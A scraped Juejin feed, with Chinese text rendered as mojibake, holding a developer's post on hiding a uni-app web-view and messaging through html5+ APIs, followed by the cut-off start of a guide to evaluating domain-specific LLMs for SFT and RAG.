ä¸ºè¦åµŒå…¥ä¸€ä¸ªåŸæœ¬å·²ç»å¼€å‘å®Œçš„ç³»ç»Ÿï¼Œæ‰“ç®—ä½¿ç”¨ web-view çš„æ–¹å¼è¿›è¡ŒåµŒå…¥ã€‚</p>
<p>å› ä¸ºé¡¹ç›®å·¥æœŸæ¯”è¾ƒç´§ï¼Œæ‰€ä»¥æ˜¯ä¸¤ä¸ªå‰ç«¯å¹¶è¡Œå¼€å‘ï¼Œæœ€åå†åˆåˆ°ä¸€èµ·ã€‚</p>
<p>ç»“æœå°±æ˜¯è¿™ä¸ªè¿‡ç¨‹ä¸­å‡ºé—®é¢˜äº†...</p>
<h2 data-id="heading-0">éœ€æ±‚</h2>
<p>éœ€æ±‚æ–¹é¢æ˜¯ï¼š</p>
<p><code>AåŒå­¦</code>è´Ÿè´£é€šè®¯æ–¹é¢çš„å·¥ä½œï¼Œæ‰€ä»¥é¡µé¢åº”è¯¥åœ¨é¦–é¡µåŠ è½½çš„æ—¶å€™å°±è¢«æŒ‚è½½ä¸Šå»ï¼Œè¿™æ ·ä¸€æ¥å¯åŠ¨ç³»ç»Ÿçš„æ—¶å€™å°±æ³¨å†Œäº†é€šè®¯æ¨¡å—ï¼Œä¸å½±å“æ”¶å‘ä¿¡æ¯ã€‚</p>
<p><code>BåŒå­¦</code>è´Ÿè´£å…¶ä»–éƒ¨åˆ†ï¼Œåœ¨é¦–é¡µå±•ç¤ºç³»ç»Ÿå†…éƒ¨çš„ç»Ÿè®¡æ•°æ®ï¼Œå¯ä»¥ç®—æ˜¯ä¸€ä¸ªå®‰å“ç«¯çš„ç®€æ˜“å¤§å±ã€‚</p>
<p>åŸæœ¬<code>AåŒå­¦</code>çš„æ–¹æ¡ˆæ˜¯åœ¨ç³»ç»Ÿé¡µé¢ä¸Šåˆ›å»ºä¸€ä¸ª <code>web-view</code>ï¼Œç„¶ååµŒå…¥ç³»ç»Ÿã€‚è¿™æ ·ä¸€æ¥ä¹Ÿä¸å½±å“BåŒå­¦å¼€å‘æ–°ç³»ç»Ÿã€‚</p>
<h2 data-id="heading-1">é—®é¢˜</h2>
<p>ç»“æœæ•´åˆä»£ç çš„æ—¶å€™æ‰å‘ç°ï¼Œ<code>web-view</code>æ ‡ç­¾ æ˜¯<strong>è‡ªåŠ¨é“ºæ»¡æ•´ä¸ªé¡µé¢</strong>çš„ï¼Œè€Œä¸”æ˜¯<strong>æ— æ³•éšè—</strong>çš„ã€‚</p>
<p>è¿™å°±å°´å°¬äº†ï¼ŒAppè¿›æ¥ä»¥åç›´æ¥çœ‹åˆ°çš„å°±æ˜¯ <code>AåŒå­¦</code>çš„é€šè®¯é¡µé¢ï¼Œæ— æ³•çœ‹åˆ°<code>BåŒå­¦</code>çš„å¤§å±äº†ã€‚</p>
<p>é—®é¢˜æŠ›åˆ°äº†æˆ‘æ‰‹é‡Œï¼Œæˆ‘ç»è¿‡ä¸€ç•ªç®€å•çš„è°ƒç ”ï¼Œå†åŠ ä¸Šä¸€é¡¿çŒ›å¦‚è™çš„æ“ä½œï¼Œåˆé€šè¿‡ <strong>Trae</strong> ä¸€é¡¿AIï¼Œæœ€åå›å¤ä»–ä»¬è¯´ï¼š<strong>æ— è§£</strong>ï¼</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/43f8dfd3e0884546ab40824d14f7de63~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2O5YmR5LiA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768993404&amp;x-signature=lUwkIJyI5td7ffl7BJad83W77OI%3D" alt="image.png" loading="lazy"/></p>
<p>å¯¹æ­¤ <strong>Trae</strong> ç»™å‡ºçš„åŸå› æ˜¯ï¼šuni-app ä¸­å†…ç½®çš„ <code>web-view</code> æ ‡ç­¾æœ¬èº«æ²¡æœ‰éšè—çš„APIï¼Œåœ¨ web-view æ ‡ç­¾å¤–å¢åŠ  view æ ‡ç­¾ï¼Œç»‘å®š <code>v-show</code> æ–¹æ³•ä¸ç”Ÿæ•ˆã€‚</p>
<p>åªèƒ½ç»‘å®š <code>v-if</code> ç”Ÿæ•ˆï¼Œä½†æ˜¯ç»‘å®š <code>v-if=false</code> çš„æ—¶å€™ç›¸å½“äº web-view ç›´æ¥è¢«<strong>é”€æ¯</strong>äº†ï¼Œä¼šå¯¼è‡´é€šè®¯æ¨¡å—æ”¶ä¸åˆ°ä¿¡æ¯ã€‚</p>
<h2 data-id="heading-2">è§£å†³</h2>
<p>å¥½åœ¨å¤©æ— ç»äººä¹‹è·¯ï¼Œuni-app å®˜æ–¹æ–‡æ¡£ä¸­è¡¨ç¤ºï¼šåœ¨ html5+ ä¸­å…¶å®å­˜åœ¨ web-view çš„ APIï¼Œèƒ½å¤Ÿæ“ä½œçª—å£çš„å¤§å°ã€‚</p>
<p>é‚£ä¹ˆæ—¢ç„¶èƒ½å¤Ÿæ“ä½œçª—å£çš„å¤§å°ï¼Œè‚¯å®šä¹Ÿèƒ½å¤Ÿæ§åˆ¶æ˜¾éšã€‚</p>
<p>äºæ˜¯ä¹æˆ‘ä½¿ç”¨ <strong>Trae</strong> è®©ä»–ä½¿ç”¨ html5+ ä¸­çš„ <code>create</code> æ–¹æ³•åˆ›å»º web-viewï¼Œå¹¶ç»™å‡ºå®Œæ•´çš„è§£å†³æ–¹æ¡ˆã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title function_">createWebView</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">let</span> that = <span class="hljs-variable language_">this</span>;
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">webviewIns</span>) <span class="hljs-keyword">return</span>;

    <span class="hljs-variable language_">this</span>.<span class="hljs-property">webviewIns</span> = plus.<span class="hljs-property">webview</span>.<span class="hljs-title function_">create</span>(
        <span class="hljs-string">'http://192.168.25.110'</span>,
        <span class="hljs-string">'1008610010'</span> <span class="hljs-comment">// IDï¼ˆå¿…é¡»å”¯ä¸€ï¼‰</span>
        {
            <span class="hljs-attr">top</span>: <span class="hljs-string">'24px'</span>,
            <span class="hljs-attr">bottom</span>: <span class="hljs-string">'0px'</span>,
            <span class="hljs-attr">width</span>: <span class="hljs-string">'300px'</span>,
            <span class="hljs-attr">height</span>: <span class="hljs-string">'600px'</span>,
            <span class="hljs-attr">scrollIndicator</span>: <span class="hljs-string">'none'</span>,
            <span class="hljs-attr">scalable</span>: <span class="hljs-literal">false</span>
        }
    );

    <span class="hljs-comment">// è®¾ç½®é¡µé¢é»˜è®¤éšè—</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">webviewIns</span>.<span class="hljs-title function_">hide</span>();
}
</code></pre>
<p>è¿™æ—¶å€™å·²ç»æˆåŠŸåˆ›å»ºäº† web-view å¹¶ä¸”å¤„äºéšè—çŠ¶æ€ï¼Œä¸è€½è¯¯ä¼ å‚ã€‚</p>
<p>ä½†æ˜¯åˆé‡åˆ°äº†ä¸€ä¸ªé—®é¢˜ï¼Œweb-viewæ— æ³•ä¸uni-app<strong>é€šä¿¡</strong>ã€‚</p>
<p>Trae å…ˆç»™å‡ºäº† uni-app å®˜æ–¹æä¾›çš„æ–¹æ³•ï¼Œä½¿ç”¨ <code>uni.postMessage</code> æ–¹æ³•ï¼Œä½†æ˜¯åœ¨é€šè®¯ç³»ç»Ÿä¸­æ’å…¥äº†è¿™ä¸ªæ–¹æ³•ä»¥åï¼Œä¸æŠ¥é”™ï¼Œå¹¶ä¸”æ˜¾ç¤ºå‘é€æ¶ˆæ¯æˆåŠŸï¼Œä½†uni-app è¿™è¾¹å´æ— æ³•æ¥æ”¶åˆ°ã€‚</p>
<p>Trae åˆä½¿ç”¨ <code>evalJS</code> æ–¹æ³•æ’å…¥ç›¸åº”çš„è„šæœ¬ï¼Œä½†æ˜¯ä¹Ÿæ²¡æœ‰ååº”ã€‚åŒæ ·æ˜¯å‘é€æˆåŠŸï¼Œä½†æ˜¯æ¥æ”¶ä¸åˆ°ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c0b779ce4c0a4794bd4cdced445bdf0b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2O5YmR5LiA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768993404&amp;x-signature=wYXK%2FZQTfX9bGYH%2B5khBzLiAuOE%3D" alt="image.png" loading="lazy"/></p>
<hr/>
<p>ä¸¤ç§æ–¹æ¡ˆå‡ä¸å¯ç”¨ï¼Œæˆ‘åˆè¯¦ç»†çœ‹äº†çœ‹ uni-app çš„å®˜æ–¹æ–‡æ¡£ï¼Œè®© Trae åˆ†æ web-view æ ‡ç­¾ä¸Šç»‘å®šçš„ <code>@message</code> æ–¹æ³•åº”è¯¥æ˜¯ç»è¿‡ç‰¹æ®Šå°è£…çš„ï¼Œèƒ½å¤Ÿæ•è·åˆ° view-view å†…ä½¿ç”¨ <code>uni.postMessage</code> æ–¹æ³•å‘é€çš„æ•°æ®ã€‚</p>
<p>Traeç»™å‡ºçš„è§£é‡Šæ˜¯ï¼šç”±äºæˆ‘ç°åœ¨ä½¿ç”¨ <code>plus.web-view.create</code> åˆ›å»ºçª—å£ï¼Œç»•è¿‡äº†uni-app æ‰€ä»¥å³ä¾¿æ˜¯ç»‘å®š <code>message</code> ä¹Ÿæ— æ•ˆäº†ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3b0c925c31d3435ab879f6a3908f9626~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p2O5YmR5LiA:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768993404&amp;x-signature=Z%2B%2Fx0VnhbT5iKgYi9Gqpbs1TiiU%3D" alt="image.png" loading="lazy"/></p>
<p>æ‰€ä»¥é‡‡ç”¨ html+ åŸç”Ÿæ–¹æ³•å‘é€æ•°æ®ï¼Œåœ¨ web-view ä¸­ä½¿ç”¨ <code>plus.webview.postMessageToUniNView</code> æ–¹æ³•å‘é€æ•°æ®ã€‚</p>
<p>åœ¨ uni-app ç«¯ä½¿ç”¨ <code>plus.globalEvent.addEventListener</code> æ¥æ”¶æ•°æ®ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// å‘é€æ•°æ®</span>
<span class="hljs-title function_">pushMessage</span>(<span class="hljs-params"/>) {
    plus.<span class="hljs-property">webview</span>.<span class="hljs-title function_">postMessageToUniNView</span>({
        <span class="hljs-attr">type</span>: <span class="hljs-string">'tpUniAPP'</span>,
        <span class="hljs-attr">args</span>: {
            <span class="hljs-attr">args1</span>: <span class="hljs-string">'test123'</span>
        }
    }, <span class="hljs-string">'__uniapp__service'</span>);
}
</code></pre>
<p>æ¥æ”¶æ•°æ®æ–¹æ³•å†™åœ¨ <code>createWebView</code> æ–¹æ³•å†…ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// æ¥æ”¶æ•°æ®</span>
<span class="hljs-title function_">createWebView</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">let</span> that = <span class="hljs-variable language_">this</span>;
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">webviewIns</span>) <span class="hljs-keyword">return</span>;

    <span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªæ–°çš„ WebView</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">webviewIns</span> = plus.<span class="hljs-property">webview</span>.<span class="hljs-title function_">create</span>(
        ...
    );
    
    <span class="hljs-comment">// web-viewåŠ è½½å®Œæˆ</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">webviewIns</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'loaded'</span>, <span class="hljs-function">() =&gt;</span> {
        plus.<span class="hljs-property">globalEvent</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'plusMessage'</span>, <span class="hljs-function">(<span class="hljs-params">message</span>)=&gt;</span>{
            <span class="hljs-keyword">let</span> data = message?.<span class="hljs-property">data</span>?.<span class="hljs-property">args</span>?.<span class="hljs-property">data</span>;
            <span class="hljs-keyword">if</span>(data?.<span class="hljs-property">name</span> === <span class="hljs-string">'postMessage'</span>) {
                <span class="hljs-keyword">if</span> (data?.<span class="hljs-property">arg</span>?.<span class="hljs-property">type</span> === <span class="hljs-string">'show'</span>) {
                    <span class="hljs-comment">// æ˜¾ç¤º</span>
                    that.<span class="hljs-property">webviewIns</span>.<span class="hljs-title function_">show</span>();
                }
                <span class="hljs-keyword">if</span> (data?.<span class="hljs-property">arg</span>?.<span class="hljs-property">type</span> === <span class="hljs-string">'hide'</span>) {
                    <span class="hljs-comment">// éšè—</span>
                    that.<span class="hljs-property">webviewIns</span>.<span class="hljs-title function_">hide</span>();
                }
            }
        })
    });
    
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">webviewIns</span>.<span class="hljs-title function_">hide</span>();
},
</code></pre>
<h2 data-id="heading-3">ç»“è®º</h2>
<p>ç›®å‰ä¸»è¦è§£å†³äº†ä¸¤ä¸ªé—®é¢˜ï¼š</p>
<ol>
<li>web-view å¤§å°ã€æ˜¾éšä¸å¯æ§é—®é¢˜ã€‚</li>
<li>web-view ä¸ uni-app é€šä¿¡é—®é¢˜ã€‚</li>
</ol>
<p>å‘é€æ•°æ®æ–¹æ³•å¯ä»¥å¸è½½ Pinia çš„å…¬å…±æ–¹æ³•ä¸­ï¼Œæˆ–è€…ä½¿ç”¨ EventBusï¼Œç»Ÿä¸€å¤„ç†ã€‚</p>
<p>Ps: ç¬¬äºŒä¸ªé—®é¢˜è§£å†³æ–¹æ¡ˆä¸æ˜¯å¤ªä¼˜é›…ï¼Œå¦‚æœæœ‰å…„å¼Ÿæœ‰æ›´å¥½çš„æ–¹æ¡ˆå¯ä»¥åˆ†äº«ä¸€ä¸‹ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[SFTã€RAG è°ƒä¼˜æ•ˆç‡ç¿»å€ï¼å‚ç›´é¢†åŸŸå¤§æ¨¡å‹è¯„ä¼°å®æˆ˜æŒ‡å—]]></title>    <link>https://juejin.cn/post/7594791357144383530</link>    <guid>https://juejin.cn/post/7594791357144383530</guid>    <pubDate>2026-01-14T11:29:48.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594791357144383530" data-draft-id="7594791357144367146" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="SFTã€RAG è°ƒä¼˜æ•ˆç‡ç¿»å€ï¼å‚ç›´é¢†åŸŸå¤§æ¨¡å‹è¯„ä¼°å®æˆ˜æŒ‡å—"/> <meta itemprop="keywords" content="å‰ç«¯,åç«¯,JavaScript"/> <meta itemprop="datePublished" content="2026-01-14T11:29:48.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ConardLi"/> <meta itemprop="url" content="https://juejin.cn/user/3949101466785709"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            SFTã€RAG è°ƒä¼˜æ•ˆç‡ç¿»å€ï¼å‚ç›´é¢†åŸŸå¤§æ¨¡å‹è¯„ä¼°å®æˆ˜æŒ‡å—
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3949101466785709/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ConardLi
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T11:29:48.000Z" title="Wed Jan 14 2026 11:29:48 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»17åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æœ¬æœŸè§†é¢‘æ•™ç¨‹ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1CRrVB7Eb4%2F" target="_blank" title="https://www.bilibili.com/video/BV1CRrVB7Eb4/" ref="nofollow noopener noreferrer">www.bilibili.com/video/BV1CRâ€¦</a></p>
<hr/>
<ul>
<li>å¦‚ä½•è¯„ä¼°æ¨¡å‹åœ¨å‚ç›´é¢†åŸŸä¸‹çš„è¡¨ç°ï¼Ÿ</li>
<li>å¦‚ä½•è¯„ä¼°æ¨¡å‹å¾®è°ƒå‰åçš„æ•ˆæœï¼Ÿ</li>
<li>å¦‚ä½•é‡åŒ– RAG ç³»ç»Ÿçš„å¬å›ç‡ï¼Ÿ</li>
<li>å¦‚ä½•ä»é¢†åŸŸçŸ¥è¯†åˆ›å»ºæ¨¡å‹è¯„ä¼°æ•°æ®é›†ï¼Ÿ</li>
</ul>
<hr/>
<p>å¤§å®¶å¥½ï¼Œæ¬¢è¿æ¥åˆ° codeç§˜å¯†èŠ±å›­ï¼Œæˆ‘æ˜¯èŠ±å›­è€å¸ˆï¼ˆConardLiï¼‰ã€‚</p>
<p>ç°åœ¨å¤§å®¶éƒ½åœ¨æå¤§æ¨¡å‹è½åœ°ï¼Œä¸ç®¡æ˜¯åš RAGï¼ˆæ£€ç´¢å¢å¼ºç”Ÿæˆï¼‰è¿˜æ˜¯ SFTï¼ˆç›‘ç£å¾®è°ƒï¼‰ï¼Œæœ€è®©å¼€å‘è€…å¤´ç§ƒçš„å…¶å®ä¸æ˜¯ â€œæ€ä¹ˆè®­ç»ƒâ€ï¼Œè€Œæ˜¯ â€œæ€ä¹ˆçŸ¥é“è®­ç»ƒå¾—å¥½ä¸å¥½â€ã€‚</p>
<p>åœ¨ä¸Šä¸€æœŸæ•™ç¨‹ï¼šã€Š<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FkQIcb6gggF5wf08qjuJcyQ" target="_blank" title="https://mp.weixin.qq.com/s/kQIcb6gggF5wf08qjuJcyQ" ref="nofollow noopener noreferrer">ä¸–ç•Œæœ€é¡¶çº§çš„å¤§æ¨¡å‹ï¼Œéƒ½åœ¨ PK äº›å•¥ï¼Ÿ ï¼ˆå¤§æ¨¡å‹è¯„ä¼°å®Œå…¨æŒ‡å—ï¼‰</a>ã€‹ ä¸­ï¼Œæˆ‘ä»¬ä¸»è¦ä»‹ç»äº†å¤§æ¨¡å‹è¯„ä¼°çš„æ ¸å¿ƒæµç¨‹å’Œä¸šç•Œä¸»æµçš„ä¸€äº›é€šç”¨ Benchmarkï¼ˆåŸºå‡†æµ‹è¯•ï¼‰ã€‚</p>
<p>è¿™äº›åŸºå‡†ä¸€èˆ¬éƒ½ç”¨äºé€šç”¨å¤§æ¨¡å‹çš„èƒ½åŠ›æµ‹è¯•ï¼Œæ¦œå•ï¼ˆåƒ <code>MMLUã€ARC</code> ï¼‰åˆ†æ•°å†é«˜ï¼Œä¸€æ—¦ç”¨åˆ°å…·ä½“çš„ä¸šåŠ¡åœºæ™¯ï¼Œæ¯”å¦‚æ³•å¾‹åˆåŒå®¡æ ¸ã€åŒ»ç–—æŠ¥å‘Šåˆ†æã€æˆ–è€…å…¬å¸å†…éƒ¨çš„ç»´ä¿®æ‰‹å†Œï¼Œè¿™äº›é€šç”¨åˆ†æ•°çš„å‚è€ƒæ„ä¹‰å°±éå¸¸æœ‰é™äº†ã€‚</p>
<p>ä»Šå¤©æˆ‘ä»¬å°±æ¥èŠèŠï¼Œåœ¨å‚ç›´é¢†åŸŸï¼Œæˆ‘ä»¬å…·ä½“åº”è¯¥æ€ä¹ˆè¯„ä¼°æ¨¡å‹çš„è¡¨ç°ï¼Ÿ</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1f69bc972fa7478ab01abdb07c742366~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=7M2e%2FogNyaJjTylym0fMHqIg%2FVM%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-0">ç¬¬ä¸€éƒ¨åˆ†ï¼šç†è®ºç¯‡</h2>
<h3 data-id="heading-1">1. ä¸ºä»€ä¹ˆé€šç”¨è¯„ä¼°ä¸å¤Ÿç”¨ï¼Ÿ</h3>
<p>é€šç”¨æ¨¡å‹å¾€å¾€åœ¨å…¬å¼€äº’è”ç½‘è¯­æ–™ä¸Šè¡¨ç°è‰¯å¥½ï¼Œä½†å¯¹äºä¼ä¸šå†…éƒ¨æ–‡æ¡£ã€æœªå…¬å¼€çš„è¡Œä¸šè§„èŒƒç­‰â€œé•¿å°¾çŸ¥è¯†â€è¡¨ç°ä¸ä½³ï¼Œå¿…é¡»è¿›è¡Œä¸“é¡¹è¯„ä¼°ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/84026c8ee4e0426ba5e19741619e7124~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ29uYXJkTGk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768995815&amp;x-signature=EBPd5Wf%2FHmUhTzEnbY%2BWJYBTWzI%3D" alt="" loading="lazy"/></p>
<p>æˆ‘ä»¬åœ¨å®é™…ä¸šåŠ¡ä¸­ï¼Œè¯„ä¼°æ¨¡å‹é€šå¸¸æ˜¯ä¸ºäº†è§£å†³ä¸‰ä¸ªå¾ˆå…·ä½“çš„é—®é¢˜ï¼š</p>
<ul>
<li>
<p><strong>é€‰å‹å¿ƒé‡Œæ²¡åº•ï¼š</strong>
å¼€æºæ¨¡å‹é‚£ä¹ˆå¤šï¼ˆQwen, DeepSeek, MiniMax...ï¼‰ï¼Œåœ¨æ²¡å¾®è°ƒä¹‹å‰ï¼Œè°å¯¹æˆ‘çš„ä¸šåŠ¡æ–‡æ¡£ç†è§£èƒ½åŠ›æ›´å¼ºï¼Ÿå¦‚æœä¸è·‘ä¸€éè‡ªå·±çš„æ•°æ®ï¼Œç›²é€‰å¾ˆå®¹æ˜“è¸©å‘ã€‚</p>
</li>
<li>
<p><strong>å¾®è°ƒæ•ˆæœéªŒè¯ï¼ˆSFTï¼‰ï¼š</strong>
ä½ èŠ±é’±èŠ±æ—¶é—´å¾®è°ƒäº†ä¸€ä¸ªæ¨¡å‹ï¼ŒLoss æ›²çº¿çœ‹ç€æŒºå¥½ï¼Œä½†æ¨¡å‹çœŸçš„å˜èªæ˜äº†å—ï¼Ÿè¿˜æ˜¯è¯´å®ƒåªæ˜¯è®°ä½äº†è®­ç»ƒé›†ï¼Ÿæ›´ç³Ÿç³•çš„æ˜¯ï¼Œå®ƒä¼šä¸ä¼šå­¦ä¼šäº†ä¸“ä¸šçŸ¥è¯†ï¼Œå´æŠŠé€šç”¨çš„å¯¹è¯èƒ½åŠ›æä¸¢äº†ï¼ˆç¾éš¾æ€§é—å¿˜ï¼‰ï¼Ÿè¿™éœ€è¦å¯¹æ¯”æµ‹è¯•æ‰çŸ¥é“ã€‚</p>
</li>
<li>
<p><strong>RAG ç³»ç»Ÿçš„â€œç”©é”…â€ä¾æ®ï¼š</strong>
